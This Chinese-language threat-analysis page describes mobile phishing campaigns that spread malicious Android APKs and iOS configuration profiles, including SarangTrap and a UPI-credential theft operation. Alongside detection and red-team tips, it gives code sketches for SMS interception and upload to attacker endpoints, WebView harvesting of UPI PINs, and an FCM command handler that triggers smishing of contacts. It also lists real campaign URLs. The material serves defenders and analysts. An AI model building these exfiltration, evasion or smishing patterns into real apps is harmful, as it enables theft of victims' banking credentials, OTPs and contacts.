# 移动钓鱼与恶意应用分发（Android 和 iOS）

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 本页面涵盖了威胁行为者通过钓鱼（SEO、社交工程、假商店、约会应用等）分发**恶意 Android APK**和**iOS 移动配置文件**的技术。
> 材料改编自 Zimperium zLabs（2025）曝光的 SarangTrap 活动和其他公开研究。

## 攻击流程

1. **SEO/钓鱼基础设施**
* 注册数十个相似域名（约会、云分享、汽车服务等）。
– 在 `<title>` 元素中使用本地语言关键词和表情符号以在 Google 中排名。
– 在同一着陆页上托管*Android*（`.apk`）和*iOS* 安装说明。
2. **第一阶段下载**
* Android：直接链接到*未签名*或“第三方商店”APK。
* iOS：`itms-services://`或普通 HTTPS 链接到恶意**mobileconfig**配置文件（见下文）。
3. **安装后的社交工程**
* 应用首次运行时要求输入**邀请/验证代码**（独占访问幻觉）。
* 代码通过**HTTP POST**发送到指挥与控制（C2）。
* C2 回复 `{"success":true}` ➜ 恶意软件继续。
* 动态分析沙箱/AV未提交有效代码时未见**恶意行为**（规避）。
4. **运行时权限滥用**（Android）
* 仅在收到正面 C2 响应后请求危险权限：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- 较旧版本也请求 SMS 权限 -->
```
* 最近的变种**从 `AndroidManifest.xml` 中移除 SMS 的 `<uses-permission>`**，但保留通过反射读取 SMS 的 Java/Kotlin 代码路径 ⇒ 降低静态评分，同时在通过 `AppOps` 滥用或旧目标授予权限的设备上仍然有效。
5. **外观 UI 和后台收集**
* 应用显示无害视图（SMS 查看器、图库选择器）在本地实现。
* 同时，它提取：
- IMEI / IMSI，电话号码
- 完整的 `ContactsContract` 转储（JSON 数组）
- 从 `/sdcard/DCIM` 压缩的 JPEG/PNG，使用 [Luban](https://github.com/Curzibn/Luban) 减小大小
- 可选 SMS 内容（`content://sms`）
有效载荷通过 `HTTP POST /upload.php` **批量压缩**并发送。
6. **iOS 交付技术**
* 单个**移动配置文件**可以请求 `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等，以将设备注册到“MDM”类监督中。
* 社交工程指令：
1. 打开设置 ➜ *配置文件已下载*。
2. 点击 *安装* 三次（钓鱼页面上的截图）。
3. 信任未签名的配置文件 ➜ 攻击者获得*联系人*和*照片*权限，无需 App Store 审核。
7. **网络层**
* 普通 HTTP，通常在端口 80 上，HOST 头如 `api.<phishingdomain>.com`。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（无 TLS → 易于发现）。

## 防御测试 / 红队提示

* **动态分析规避** – 在恶意软件评估期间，使用 Frida/Objection 自动化邀请代码阶段以达到恶意分支。
* **清单与运行时差异** – 比较 `aapt dump permissions` 与运行时 `PackageManager#getRequestedPermissions()`；缺少危险权限是一个红旗。
* **网络金丝雀** – 配置 `iptables -p tcp --dport 80 -j NFQUEUE` 以检测代码输入后不稳定的 POST 峰值。
* **mobileconfig 检查** – 在 macOS 上使用 `security cms -D -i profile.mobileconfig` 列出 `PayloadContent` 并发现过多的权限。

## 蓝队检测思路

* **证书透明度 / DNS 分析** 以捕捉突发的关键词丰富域名。
* **User-Agent 和路径正则表达式**： `(?i)POST\s+/(check|upload)\.php` 来自 Google Play 之外的 Dalvik 客户端。
* **邀请代码遥测** – 在 APK 安装后不久的 6–8 位数字代码的 POST 可能表明正在准备。
* **MobileConfig 签名** – 通过 MDM 策略阻止未签名的配置文件。

## 有用的 Frida 代码片段：自动绕过邀请代码
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## 指标 (通用)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

此模式已在利用政府福利主题的活动中观察到，目的是窃取印度UPI凭证和一次性密码（OTPs）。操作者链式使用信誉良好的平台以实现交付和韧性。

### 通过受信平台的交付链
- YouTube视频诱饵 → 描述中包含一个短链接
- 短链接 → GitHub Pages钓鱼网站模仿合法门户
- 同一GitHub仓库托管一个带有假“Google Play”徽章的APK，直接链接到文件
- 动态钓鱼页面托管在Replit上；远程命令通道使用Firebase Cloud Messaging (FCM)

### 带有嵌入有效载荷和离线安装的投放器
- 第一个APK是一个安装程序（投放器），它在`assets/app.apk`中传送真实恶意软件，并提示用户禁用Wi‑Fi/移动数据以减轻云检测。
- 嵌入的有效载荷以无害标签（例如，“安全更新”）安装。安装后，安装程序和有效载荷作为独立应用程序存在。

静态分类提示（grep嵌入有效载荷）：
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 动态端点发现通过短链接
- 恶意软件从短链接获取一个纯文本的、以逗号分隔的活动端点列表；简单的字符串转换生成最终的钓鱼页面路径。

示例（已清理）：
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
伪代码：
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### 基于WebView的UPI凭证收集
- “支付₹1 / UPI‑Lite”步骤从动态端点加载攻击者的HTML表单到WebView中，并捕获敏感字段（电话、银行、UPI PIN），这些字段会被`POST`到`addup.php`。

最小加载器：
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 自我传播和短信/一次性密码拦截
- 在首次运行时请求激进的权限：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 联系人被循环用于从受害者的设备上批量发送钓鱼短信。
- 通过广播接收器拦截传入的短信，并将其与元数据（发送者、内容、SIM卡插槽、每个设备的随机ID）一起上传到`/addsm.php`。

接收器草图：
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) 作为弹性 C2
- 负载注册到 FCM；推送消息携带一个 `_type` 字段，用作触发动作的开关（例如，更新钓鱼文本模板，切换行为）。

示例 FCM 负载：
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
处理程序草图：
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK包含次要有效载荷在`assets/app.apk`
- WebView从`gate.htm`加载支付并外泄到`/addup.php`
- 短信外泄到`/addsm.php`
- 短链接驱动的配置获取（例如，`rebrand.ly/*`）返回CSV端点
- 应用标记为通用“更新/安全更新”
- FCM `data`消息在不受信任的应用中带有`_type`区分符

### Detection & defence ideas
- 标记指示用户在安装期间禁用网络的应用，然后从`assets/`侧载第二个APK。
- 对权限元组发出警报：`READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + 基于WebView的支付流程。
- 对非企业主机的`POST /addup.php|/addsm.php`进行出口监控；阻止已知基础设施。
- 移动EDR规则：不受信任的应用注册FCM并在`_type`字段上分支。

---

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
